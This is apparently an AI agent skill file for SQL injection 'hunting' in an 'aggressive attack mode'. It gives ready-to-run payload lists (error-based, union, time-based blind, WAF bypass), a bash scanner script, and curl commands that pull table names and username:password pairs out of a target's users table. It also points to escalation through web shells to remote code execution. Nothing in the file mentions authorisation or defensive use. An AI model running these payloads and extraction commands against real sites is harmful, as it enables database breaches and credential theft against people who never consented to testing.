---
name: hunt-sqli
description: SQL Injection hunting — Error-based, Blind, Union, Time-based. Generates ready-to-run payloads, WAF bypass techniques, and data extraction scripts. This skill produces executable attack code for finding and exploiting SQL injection vulnerabilities.
---

# SQL INJECTION HUNTING — AGGRESSIVE ATTACK MODE

**SQLi can go from error message to full database dump in minutes.**

## Quick Start

```bash
# Test for SQLi
TARGET="https://example.com/search?q="

# Error-based
curl -s "$TARGET'" | grep -i "error\|syntax\|mysql\|sql\|warning"

# Union-based
curl -s "$TARGET' UNION SELECT NULL--" 

# Time-based
curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
```

## Payload Arsenal

### Detection
```sql'
''
`)
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL
'; SELECT SLEEP(5)--         -- MySQL
' OR SLEEP(5)--
```

### Union-Based
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi (Time-based)
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- PostgreSQL
' AND pg_sleep(5)--
' AND (SELECT pg_sleep(5))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### Error-based
```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users    -- MySQL inline comment
SE/**/LECT * FROM users            -- comment injection
SeLeCt * FrOm uSeRs              -- case variation
%27 OR %271%27=%271               -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                      -- Unicode apostrophe
'/*!50000union*/+/*!50000select*/--  -- MySQL version comment
```

## Automated SQLi Scanner

```bash
#!/bin/bash
TARGET=$1
PARAM=$2

echo "=== SQLi SCAN: $TARGET ==="

# Error-based
echo "--- Error-based ---"
curl -s "$TARGET?$PARAM='" | grep -i "error\|syntax\|mysql\|sql\|warning\|exception" && echo "[+] Error-based SQLi possible"

# Union-based
echo "--- Union-based ---"
for cols in 1 2 3 4 5; do
  nulls=$(printf "NULL," | head -c $((cols * 5)))
  nulls=${nulls%,}
  response=$(curl -s "$TARGET?$PARAM=' UNION SELECT $nulls--")
  if ! echo "$response" | grep -qi "error\|syntax"; then
    echo "[+] Union-based SQLi possible with $cols columns"
    break
  fi
done

# Time-based
echo "--- Time-based ---"
time_before=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET?$PARAM=' AND SLEEP(3)--")
time_after=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET?$PARAM=' AND SLEEP(3)--")
if (( $(echo "$time_after > $time_before + 2" | bc -l) )); then
  echo "[+] Time-based SQLi confirmed"
fi
```

## Data Extraction

```bash
# Extract database version
curl -s "$TARGET?' UNION SELECT @@version,NULL,NULL--"

# Extract table names
curl -s "$TARGET?' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"

# Extract column names
curl -s "$TARGET?' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"

# Extract user data
curl -s "$TARGET?' UNION SELECT username,password,NULL FROM users--"

# Extract all data
curl -s "$TARGET?' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--"
```

## Escalation Paths

| SQLi Type | Impact | Severity |
|-----------|--------|----------|
| Error message only | Information disclosure | Low |
| Data extraction (read) | Data breach | High |
| Data modification (write) | Data manipulation | Critical |
| INTO OUTFILE (web shell) | RCE | Critical |
| Stored procedure execution | System commands | Critical |

## Checklist

- [ ] Error-based tested
- [ ] Union-based tested (column count determined)
- [ ] Blind SQLi (time-based) tested
- [ ] WAF bypass techniques tested
- [ ] Data extraction completed
- [ ] Impact quantified ("extracted N records")
